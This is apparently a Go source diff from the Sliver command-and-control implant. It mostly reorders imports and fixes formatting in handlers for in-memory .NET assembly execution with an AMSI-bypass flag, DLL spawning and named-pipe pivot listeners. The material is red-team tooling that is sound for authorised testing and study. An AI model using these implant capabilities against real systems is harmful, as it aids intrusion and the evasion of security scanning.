@@ -25,9 +25,9 @@ import (
 
 	"github.com/bishopfox/sliver/protobuf/commonpb"
 	"github.com/bishopfox/sliver/protobuf/sliverpb"
+	"github.com/bishopfox/sliver/sliver/pivots"
 	"github.com/bishopfox/sliver/sliver/priv"
 	"github.com/bishopfox/sliver/sliver/taskrunner"
-	"github.com/bishopfox/sliver/sliver/pivots"
 	"github.com/bishopfox/sliver/sliver/transports"
 
 	"github.com/golang/protobuf/proto"
@@ -173,7 +173,7 @@ func executeAssemblyHandler(data []byte, resp RPCResponse) {
 		return
 	}
 	output, err := taskrunner.ExecuteAssembly(execReq.HostingDll, execReq.Assembly, execReq.Process, execReq.Arguments, execReq.AmsiBypass)
-	execAsm := &sliverpb.ExecuteAssembly{Output: output}
+	execAsm := &sliverpb.ExecuteAssembly{Output: []byte(output)}
 	if err != nil {
 		execAsm.Response = &commonpb.Response{
 			Err: err.Error(),
@@ -239,8 +239,6 @@ func spawnDllHandler(data []byte, resp RPCResponse) {
 	resp(data, err)
 }
 
-
-
 func namedPipeListenerHandler(envelope *sliverpb.Envelope, connection *transports.Connection) {
 	namedPipeReq := &sliverpb.NamedPipesReq{}
 	err := proto.Unmarshal(envelope.Data, namedPipeReq)
@@ -249,7 +247,7 @@ func namedPipeListenerHandler(envelope *sliverpb.Envelope, connection *transport
 		log.Printf("error decoding message: %v", err)
 		// {{end}}
 		namedPipeResp := &sliverpb.NamedPipes{
-			Success: false,
+			Success:  false,
 			Response: &commonpb.Response{Err: err.Error()},
 		}
 		data, _ := proto.Marshal(namedPipeResp)
@@ -265,7 +263,7 @@ func namedPipeListenerHandler(envelope *sliverpb.Envelope, connection *transport
 		log.Printf("error with listener: %s", err.Error())
 		// {{end}}
 		namedPipeResp := &sliverpb.NamedPipes{
-			Success: false,
+			Success:  false,
 			Response: &commonpb.Response{Err: err.Error()},
 		}
 		data, _ := proto.Marshal(namedPipeResp)
